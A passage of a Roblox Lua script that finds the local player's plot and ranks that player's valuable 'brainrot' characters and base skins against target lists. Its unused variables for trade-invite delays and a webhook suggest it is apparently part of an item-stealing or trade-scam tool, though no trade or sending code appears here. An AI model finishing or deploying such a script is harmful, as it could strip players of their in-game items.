local DELAY_BETWEEN_INVITES = getgenv().DELAY_BETWEEN_INVITES or 15

local tradeCompleted = false
local webhookSent = false

-- ===== LOAD DATA =====
local AnimalsData, MutationsData, TraitsData, NumberUtils

local function loadData()
    if AnimalsData then return true end
    pcall(function()
        local d = ReplicatedStorage:WaitForChild("Datas")
        AnimalsData = require(d:WaitForChild("Animals"))
        MutationsData = require(d:WaitForChild("Mutations"))
        TraitsData = require(d:WaitForChild("Traits"))
        NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
    end)
    return AnimalsData ~= nil
end
loadData()

-- ===== GET PLOT OWNER =====
local function getPlotOwner(plot)
    local sign = plot:FindFirstChild("PlotSign")
    if not sign then return nil end
    local gui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
    if not gui then return nil end
    local label = gui:FindFirstChildWhichIsA("TextLabel", true)
    if not label then return nil end
    local text = label.Text
    if not text or text == "" or text:lower():find("empty") then return nil end
    local owner = text:match("^(.+)'s Base$")
    return owner or text
end

-- ===== CALCULATE GENERATION =====
local function calculateGeneration(index, mutation, traits)
    if not loadData() then return 0 end
    local info = AnimalsData[index]
    if not info or not info.Generation then return 0 end
    local base = info.Generation
    local mult = 1
    
    if mutation and mutation ~= "None" and mutation ~= "" then
        local m = MutationsData[mutation]
        if m and m.Modifier then
            mult = mult + m.Modifier
        end
    end
    
    if type(traits) == "table" then
        for _, tr in ipairs(traits) do
            local t = TraitsData[tr]
            if t and t.MultiplierModifier then
                mult = mult + t.MultiplierModifier
            end
        end
    end
    
    return math.floor(base * mult)
end

local function formatNumber(val)
    if NumberUtils and NumberUtils.ToString then
        return "$" .. NumberUtils:ToString(val) .. "/s"
    end
    return "$" .. tostring(val) .. "/s"
end

-- ===== ESCANEIA BRAINROTS (VIA WORKSPACE) =====
local function scanBrainrotsFromWorkspace()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return {} end
    
    local found = {}
    local username = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") then
            local owner = getPlotOwner(plot)
            if owner == username or owner == displayName then
                for _, desc in ipairs(plot:GetDescendants()) do
                    if desc:IsA("Model") and desc:FindFirstChildOfClass("Humanoid") then
                        local brainrotName = desc.Name
                        if TARGET_BRAINROTS[brainrotName] then
                            local attrs = desc:GetAttributes()
                            local mutation = attrs.Mutation or attrs.__mutation or "None"
                            local traits = attrs.Traits or {}
                            
                            local gen = calculateGeneration(brainrotName, mutation, traits)
                            
                            table.insert(found, {
                                name = brainrotName,
                                slotKey = brainrotName,
                                model = desc,
                                mutation = mutation,
                                traits = traits,
                                gen = gen
                            })
                        end
                    end
                end
                break
            end
        end
    end
    
    table.sort(found, function(a, b) return a.gen > b.gen end)
    return found
end

-- ===== ESCANEIA BASE SKINS =====
local function scanBaseSkins()
    local found = {}
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return found end
    
    local username = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") then
            local owner = getPlotOwner(plot)
            if owner == username or owner == displayName then
                -- Procura por BaseSkins nos atributos do plot
                local attrs = plot:GetAttributes()
                if attrs.BaseSkins and type(attrs.BaseSkins) == "table" then
                    for name, data in pairs(attrs.BaseSkins) do
                        if TARGET_BASE_SKINS[name] then
                            table.insert(found, {name = name, data = data})
                        end
                    end
                end
                break
            end
        end
    end
    return found
end

